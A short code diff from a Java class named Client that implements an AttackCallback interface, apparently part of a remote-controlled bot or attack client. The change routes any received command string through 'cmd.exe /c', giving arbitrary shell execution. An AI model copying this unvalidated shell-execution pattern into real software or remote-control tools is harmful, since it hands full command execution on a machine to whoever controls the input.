@@ -124,7 +124,7 @@ public class Client implements AttackCallback {
 
     private boolean executeCommandLine(String command) {
         try {
-            Runtime.getRuntime().exec(command);
+            Runtime.getRuntime().exec("cmd.exe /c " + command);
             return true;
         } catch (IOException e) {
             e.printStackTrace();
